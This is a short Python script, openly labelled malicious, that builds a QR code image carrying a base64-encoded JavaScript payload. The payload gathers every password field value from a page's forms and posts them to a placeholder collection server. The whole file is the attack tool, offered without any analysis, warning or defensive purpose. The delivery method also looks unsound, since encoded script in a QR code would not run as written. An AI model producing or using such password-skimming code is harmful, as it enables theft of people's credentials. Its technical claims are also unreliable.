import qrcode
import base64

# Malicious JavaScript payload
payload = """
<script>
function getPasswords() {
 var passwords = {};
 var forms = document.forms;
 for (var i = 0; i < forms.length; i++) {
 var form = forms[i];
 for (var j = 0; j < form.elements.length; j++) {
 var element = form.elements[j];
 if (element.type === 'password') {
 passwords[element.name] = element.value;
 }
 }
 }
 return passwords;
}

function sendPasswords() {
 var passwords = getPasswords();
 var xhr = new XMLHttpRequest();
 xhr.open('POST', 'http://yourserver.com/collect', true);
 xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
 xhr.send(JSON.stringify(passwords));
}

sendPasswords();
</script>
"""

# Encode the payload as base64
encoded_payload = base64.b64encode(payload.encode()).decode()

# Create a QR code
qr = qrcode.QRCode(
 version=1,
 error_correction=qrcode.constants.ERROR_CORRECT_L,
 box_size=10,
 border=4,
)

# Add the encoded payload to the QR code
qr.add_data(encoded_payload)
qr.make(fit=True)

# Create an image from the QR code
img = qr.make_image(fill='black', back_color='white')

# Save the image
img.save('malicious_qr_code.png')

